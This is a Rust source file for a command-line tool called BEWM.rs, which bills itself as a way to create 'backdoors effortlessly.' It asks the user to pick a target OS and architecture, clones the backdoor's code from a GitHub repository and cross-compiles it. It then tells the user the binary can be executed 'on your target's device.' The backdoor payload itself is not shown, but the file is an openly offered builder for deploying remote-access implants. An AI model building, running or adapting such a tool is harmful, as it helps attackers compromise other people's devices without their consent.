use clap::{App, Arg, SubCommand};
use colored::*;
use dialoguer::Select;
use std::fs::{copy, remove_dir_all};
use std::{
    env::current_dir,
    process::{self, Command},
};
fn main() {
    let systems = vec!["macOS", "windows", "linux"];
    let arches = vec!["64", "32"];
    let system_rust_names = vec!["apple-darwin", "pc-windows-gnu", "unknown-linux-musl"];
    let arch_rust_names = vec!["x86_64", "i686"];
    let arch: usize;
    let direc = current_dir().unwrap();
    let matches = App::new("BEWM.rs")
        .about("Backdoors Effortlessly, With Mainly rust.")
        .setting(clap::AppSettings::ArgRequiredElseHelp)
        .version("0.1.0")
        .author("Jabster28 <justynboyer@gmail.com>")
        // .arg(
        //     Arg::with_name("v")
        //         .short("v")
        //         .multiple(true)
        //         .help("Sets the level of verbosity"),
        // )
        .subcommand(
            SubCommand::with_name("create")
                .about("creates a BEWM executable to be ran on the target OS")
                .arg(
                    Arg::with_name("target")
                        .short("t")
                        .long("target")
                        .alias("os")
                        .help("target OS to build to")
                        .case_insensitive(true)
                        .possible_values(&systems)
                        .takes_value(true),
                )
                .arg(
                    Arg::with_name("architecture")
                        .short("a")
                        .long("arch")
                        .alias("arch")
                        .help("arch target to build to")
                        .case_insensitive(true)
                        .possible_values(&arches)
                        .takes_value(true),
                ),
        )
        .get_matches();
    if let Some(ref matches) = matches.subcommand_matches("create") {
        println!("Welcome to the BEWM creator! 💥");
        let selection = if !matches.is_present("target") {
            println!("Please choose an OS to target:");
            Select::new().items(&systems).default(0).interact().unwrap()
        } else {
            systems
                .iter()
                .position(|&e| {
                    e.to_lowercase() == matches.value_of("target").unwrap().to_lowercase()
                })
                .unwrap()
        };
        if selection != 0 {
            arch = if !matches.is_present("architecture") {
                println!("Please choose an architecture:");
                Select::new().items(&arches).default(0).interact().unwrap()
            } else {
                arches
                    .iter()
                    .position(|&e| {
                        e.to_lowercase() == matches.value_of("architecture").unwrap().to_lowercase()
                    })
                    .unwrap()
            };
            // arch = Select::new().items(&arches).default(0).interact().unwrap();
        } else {
            arch = 0
        }
        println!("{}", "Downloading BEWM code...".yellow());
        // copy_items(
        //     &vec!["/Users/sticks/git/bewm"],
        //     dir_path.to_owned(),
        //     &options,
        // )
        // .unwrap();
        remove_dir_all(direc.join("bewm_compiled")).unwrap_or_else(|_| {});

        let mut x = Command::new("git")
            .arg("clone")
            .arg("https://github.com/Jabster28/bewm/")
            .arg(direc.join("bewm_compiled"))
            .spawn()
            .unwrap_or_else(|err| {
                eprintln!("Error: cargo failed.");
                eprintln!("{:?}", err);
                process::exit(1)
            });
        x.wait().unwrap();

        println!("{}", "Checking for cross in $PATH...".yellow());
        match Command::new("cross").arg("-v").output() {
            Ok(_) => println!("{}", "Found!".green()),
            Err(_) => {
                println!("{}", "Not found, installing through cargo...".yellow());
                let mut y = Command::new("cargo")
                    .arg("install")
                    .arg("cross")
                    .spawn()
                    .unwrap_or_else(|_e| panic!("Error: cargo failed."));
                y.wait().unwrap();
            }
        }
        println!(
            "{}",
            format!(
                "Building for {} using cross...",
                arch_rust_names[arch].to_owned() + "-" + system_rust_names[selection]
            )
            .yellow()
        );
        if (Command::new("cross")
            .current_dir(direc.join("bewm_compiled"))
            .arg("build")
            .arg("--release")
            // .arg("--manifest-path")
            // .arg(direc.join("bewm").join("Cargo.toml"))
            .arg(
                "--target=".to_owned()
                    + &arch_rust_names[arch]
                    + "-"
                    + system_rust_names[selection],
            )
            .spawn()
            .unwrap()
            .wait()
            .unwrap())
        .code()
        .unwrap()
            != 0
        {
            panic!("Error: cross failed.")
        }

        println!("{}", "Saving binary to current directory...".yellow());
        copy(
            direc.join(
                "bewm_compiled/target/".to_owned()
                    + &arch_rust_names[arch]
                    + "-"
                    + system_rust_names[selection]
                    + "/release/bewm"
                    + match selection {
                        1 => ".exe",
                        _ => "",
                    },
            ),
            direc.join(
                "bewm".to_owned()
                    + match selection {
                        1 => ".exe",
                        _ => "",
                    },
            ),
        )
        .unwrap();
        println!("{}", "Deleting old dir...".yellow());
        remove_dir_all(direc.join("bewm_compiled")).unwrap();
        println!(
            "{}",
            format!(
                "Done! You can now execute {:?} on your target's device.",
                direc.join(
                    "bewm".to_owned()
                        + match selection {
                            1 => ".exe",
                            _ => "",
                        },
                )
            )
            .green()
        )
    }
}
